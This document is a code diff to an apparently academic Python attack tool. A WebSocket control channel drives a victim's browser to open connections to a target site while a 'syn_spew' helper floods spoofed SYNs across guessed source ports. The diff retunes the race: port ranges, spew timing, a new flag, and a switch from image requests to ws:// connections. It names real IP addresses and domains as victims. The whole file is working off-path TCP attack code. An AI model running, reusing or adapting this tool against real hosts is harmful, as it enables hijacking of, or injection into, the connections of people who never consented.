@@ -37,14 +37,18 @@ class WebSocketServerFactory(Factory):
 NUM_BUCKETS = 100
 LOW_PORT = 32768
 HIGH_PORT = 61000
-#LOW_PORT = 37500
-#HIGH_PORT = 38500
+#LOW_PORT = 56300
+#HIGH_PORT = 57000
 
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
 TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
-#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
+
 #VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu
+
+#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
+#VICTIM_SITE_IMG = 'http://%d-x-%d.x.hobocomp.com'
+
 
 VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
 VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
@@ -52,10 +56,10 @@ VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
 #VICTIM_SITE = '23.21.237.114'   # factorable.net
 #VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'
 
-NEW_CONNECTION_PERIOD = 2.0
+NEW_CONNECTION_PERIOD = 0.4
 CONNECTION_TIMEOUT = 30.0
-SPEW_DELAY_US = '140'
-SPEW_TIME_MS  = '1000'   # if you don't win the race in the first few seconds, you're not going to
+SPEW_DELAY_US = '100'
+SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
 
 class ControlWebSocket(Protocol):
     """
@@ -85,7 +89,7 @@ class ControlWebSocket(Protocol):
         #self.addr.host = TEST_VICTIM_IP
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
-        os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
+        os.execvp('./syn_spew', ['./syn_spew', '-b', '-p', '%d-%d' % (low_port, high_port), \
                                 '-t', SPEW_TIME_MS, '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
@@ -133,9 +137,9 @@ class ControlWebSocket(Protocol):
 
             # chrome weirdness, when you lose, it skips a port
             # (something to do with Linux source port hints?)
-            self.min_port += 1
-            self.mid_port += 1
-            self.max_port += 1
+            #self.min_port += 1
+            #self.mid_port += 1
+            #self.max_port += 1
         
 
         # since the browser's source port will increment by one each guess,
@@ -202,8 +206,8 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             testing = "(bucket) testing"
         self.transport.write("show <b>%s %d - %d...</b>" % (testing, self.min_port, self.mid_port))
-        #self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
-        self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
+        self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
+        #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
         self.fire_time = time.time()
 
@@ -267,4 +271,5 @@ class ControlWebSocket(Protocol):
         # for whatever the fuck reason when first asked, then calms the fuck down and only opens 1
         # (or 2, you never know) to it next time.
         self.fire_time = time.time()
-        self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
+        self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
+        #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
